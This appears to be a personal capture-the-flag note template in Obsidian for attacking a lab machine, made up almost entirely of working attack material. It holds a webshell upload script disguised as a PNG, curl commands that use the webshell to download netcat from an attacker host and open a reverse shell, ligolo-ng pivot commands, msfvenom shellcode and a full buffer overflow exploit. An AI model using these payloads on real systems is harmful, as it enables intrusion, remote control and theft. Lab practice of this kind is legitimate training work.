[IP]
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
Web Address
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `http://${ip}/`;

dv.paragraph("```bash\n" + command + "\n```");
```
Editing Box

```
#!/usr/bin/env python3

import requests

def main():
    url = "http://10.129.232.19:8080/upload.php?id=test"

    s = requests.Session()
    s.get(url, verify=False)

    # PNG magic bytes
    png_magic = b"\x89\x50\x4e\x47\x0d\x0a\x1a"

    # PHP webshell
    php_payload = b'<?php system($_GET["cmd"]); ?>'

    files = {
        'file': (
            'test.php.png',
            png_magic + b"\n" + php_payload,
            'image/png'
        )
    }

    data = {
        'pupload': 'upload'
    }

    r = s.post(url, files=files, data=data, verify=False)

    if r.status_code == 200:
        print("[+] Upload successful!")
    else:
        print("[-] Upload may have failed.")

if __name__ == "__main__":
    main()
```

```
curl "http://10.129.232.19:8080/upload/test.php?cmd=powershell%20InvokeWebRequest%20-Uri%20http%3A%2F%2F10.10.16.66%2Fnc64.exe%20-Outfile%20c%3A%5Cusers%5Cpublic%5Cnc64.exe"
```

```
curl "http://10.129.232.19:8080/upload/test.php?cmd=c%3A%5Cusers%5Cpublic%5Cnc64.exe%2010.10.16.66%204444%20-e%20cmd.exe"
```

```
Invoke-WebRequest http://10.10.16.66:80/ligolo-ng_agent_0.8.2_windows_amd64.zip -OutFile agent.zip
```

```
Remove-Item agent -Recurse -Force
```

```
Expand-Archive agent1.zip
```

```
./agent.exe -connect <KALI_IP>:11601 -ignore-cert
```

```
sudo ip route add 10.129.25.107/16 dev ligolo
```

```
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.16.66 LPORT=4444 -b '\x00\x0A\x0D' -f python -v payload
```

```
payload =  b""
payload += b"\xda\xd8\xb8\x34\xec\xb0\x11\xd9\x74\x24\xf4"
payload += b"\x5b\x2b\xc9\xb1\x52\x83\xeb\xfc\x31\x43\x13"
payload += b"\x03\x77\xff\x52\xe4\x8b\x17\x10\x07\x73\xe8"
payload += b"\x75\x81\x96\xd9\xb5\xf5\xd3\x4a\x06\x7d\xb1"
payload += b"\x66\xed\xd3\x21\xfc\x83\xfb\x46\xb5\x2e\xda"
payload += b"\x69\x46\x02\x1e\xe8\xc4\x59\x73\xca\xf5\x91"
payload += b"\x86\x0b\x31\xcf\x6b\x59\xea\x9b\xde\x4d\x9f"
payload += b"\xd6\xe2\xe6\xd3\xf7\x62\x1b\xa3\xf6\x43\x8a"
payload += b"\xbf\xa0\x43\x2d\x13\xd9\xcd\x35\x70\xe4\x84"
payload += b"\xce\x42\x92\x16\x06\x9b\x5b\xb4\x67\x13\xae"
payload += b"\xc4\xa0\x94\x51\xb3\xd8\xe6\xec\xc4\x1f\x94"
payload += b"\x2a\x40\xbb\x3e\xb8\xf2\x67\xbe\x6d\x64\xec"
payload += b"\xcc\xda\xe2\xaa\xd0\xdd\x27\xc1\xed\x56\xc6"
payload += b"\x05\x64\x2c\xed\x81\x2c\xf6\x8c\x90\x88\x59"
payload += b"\xb0\xc2\x72\x05\x14\x89\x9f\x52\x25\xd0\xf7"
payload += b"\x97\x04\xea\x07\xb0\x1f\x99\x35\x1f\xb4\x35"
payload += b"\x76\xe8\x12\xc2\x79\xc3\xe3\x5c\x84\xec\x13"
payload += b"\x75\x43\xb8\x43\xed\x62\xc1\x0f\xed\x8b\x14"
payload += b"\x9f\xbd\x23\xc7\x60\x6d\x84\xb7\x08\x67\x0b"
payload += b"\xe7\x29\x88\xc1\x80\xc0\x73\x82\xa4\x1e\x6b"
payload += b"\x10\xd1\x1c\x8b\x85\x7d\xa8\x6d\xcf\x6d\xfc"
payload += b"\x26\x78\x17\xa5\xbc\x19\xd8\x73\xb9\x1a\x52"
payload += b"\x70\x3e\xd4\x93\xfd\x2c\x81\x53\x48\x0e\x04"
payload += b"\x6b\x66\x26\xca\xfe\xed\xb6\x85\xe2\xb9\xe1"
payload += b"\xc2\xd5\xb3\x67\xff\x4c\x6a\x95\x02\x08\x55"
payload += b"\x1d\xd9\xe9\x58\x9c\xac\x56\x7f\x8e\x68\x56"
payload += b"\x3b\xfa\x24\x01\x95\x54\x83\xfb\x57\x0e\x5d"
payload += b"\x57\x3e\xc6\x18\x9b\x81\x90\x24\xf6\x77\x7c"
payload += b"\x94\xaf\xc1\x83\x19\x38\xc6\xfc\x47\xd8\x29"
payload += b"\xd7\xc3\xe8\x63\x75\x65\x61\x2a\xec\x37\xec"
payload += b"\xcd\xdb\x74\x09\x4e\xe9\x04\xee\x4e\x98\x01"
payload += b"\xaa\xc8\x71\x78\xa3\xbc\x75\x2f\xc4\x94"
```

```
import socket
import sys

# Target configuration
TARGET = "10.129.25.107"
PORT = 8888

# Buffer overflow layout
padding = b"\x90" * 1052                       # Padding to reach EIP
EIP = b"\xB5\x42\xA8\x68"                      # 0x68A842B5 -> PUSH ESP ; RET
nops = b"\x90" * 30                            # NOP sled

payload =  b""
payload += b"\xda\xd8\xb8\x34\xec\xb0\x11\xd9\x74\x24\xf4"
payload += b"\x5b\x2b\xc9\xb1\x52\x83\xeb\xfc\x31\x43\x13"
payload += b"\x03\x77\xff\x52\xe4\x8b\x17\x10\x07\x73\xe8"
payload += b"\x75\x81\x96\xd9\xb5\xf5\xd3\x4a\x06\x7d\xb1"
payload += b"\x66\xed\xd3\x21\xfc\x83\xfb\x46\xb5\x2e\xda"
payload += b"\x69\x46\x02\x1e\xe8\xc4\x59\x73\xca\xf5\x91"
payload += b"\x86\x0b\x31\xcf\x6b\x59\xea\x9b\xde\x4d\x9f"
payload += b"\xd6\xe2\xe6\xd3\xf7\x62\x1b\xa3\xf6\x43\x8a"
payload += b"\xbf\xa0\x43\x2d\x13\xd9\xcd\x35\x70\xe4\x84"
payload += b"\xce\x42\x92\x16\x06\x9b\x5b\xb4\x67\x13\xae"
payload += b"\xc4\xa0\x94\x51\xb3\xd8\xe6\xec\xc4\x1f\x94"
payload += b"\x2a\x40\xbb\x3e\xb8\xf2\x67\xbe\x6d\x64\xec"
payload += b"\xcc\xda\xe2\xaa\xd0\xdd\x27\xc1\xed\x56\xc6"
payload += b"\x05\x64\x2c\xed\x81\x2c\xf6\x8c\x90\x88\x59"
payload += b"\xb0\xc2\x72\x05\x14\x89\x9f\x52\x25\xd0\xf7"
payload += b"\x97\x04\xea\x07\xb0\x1f\x99\x35\x1f\xb4\x35"
payload += b"\x76\xe8\x12\xc2\x79\xc3\xe3\x5c\x84\xec\x13"
payload += b"\x75\x43\xb8\x43\xed\x62\xc1\x0f\xed\x8b\x14"
payload += b"\x9f\xbd\x23\xc7\x60\x6d\x84\xb7\x08\x67\x0b"
payload += b"\xe7\x29\x88\xc1\x80\xc0\x73\x82\xa4\x1e\x6b"
payload += b"\x10\xd1\x1c\x8b\x85\x7d\xa8\x6d\xcf\x6d\xfc"
payload += b"\x26\x78\x17\xa5\xbc\x19\xd8\x73\xb9\x1a\x52"
payload += b"\x70\x3e\xd4\x93\xfd\x2c\x81\x53\x48\x0e\x04"
payload += b"\x6b\x66\x26\xca\xfe\xed\xb6\x85\xe2\xb9\xe1"
payload += b"\xc2\xd5\xb3\x67\xff\x4c\x6a\x95\x02\x08\x55"
payload += b"\x1d\xd9\xe9\x58\x9c\xac\x56\x7f\x8e\x68\x56"
payload += b"\x3b\xfa\x24\x01\x95\x54\x83\xfb\x57\x0e\x5d"
payload += b"\x57\x3e\xc6\x18\x9b\x81\x90\x24\xf6\x77\x7c"
payload += b"\x94\xaf\xc1\x83\x19\x38\xc6\xfc\x47\xd8\x29"
payload += b"\xd7\xc3\xe8\x63\x75\x65\x61\x2a\xec\x37\xec"
payload += b"\xcd\xdb\x74\x09\x4e\xe9\x04\xee\x4e\x98\x01"
payload += b"\xaa\xc8\x71\x78\xa3\xbc\x75\x2f\xc4\x94"

# Fill the rest of the buffer
overrun = b"C" * (1500 - len(padding + EIP + nops + payload))

# Final exploit buffer
buffer = padding + EIP + nops + payload + overrun


try:
    print(f"[+] Connecting to {TARGET}:{PORT}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET, PORT))

    print("[+] Sending exploit buffer...")
	exploit = b"LOGIN " + buffer + b"\r\n"
	s.send(exploit)

    print("[+] Payload sent!")

except Exception as e:
    print(f"[!] Exploit failed: {e}")
    sys.exit(1)
```


wget from local python server

```dataviewjs
const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `wget http://${KaliIP}:8000/[file]`;

dv.paragraph("```bash\n" + command + "\n```");
```


## Provided Credentials
---

| Username | Password | Notes |
| -------- | -------- | ----- |
|          |          |       |

---


## Open Ports
---

| Port | Service | Notes |
| ---- | ------- | ----- |
| 8080 | http    |       |

---

## Discovered Subdomains
---


---

## Discovered Credentials
---

| Username | Password | Notes |
| -------- | -------- | ----- |
|          |          |       |

---

## Attack Angles
---


---

## User Flag

```

```

## Root Flag

```

```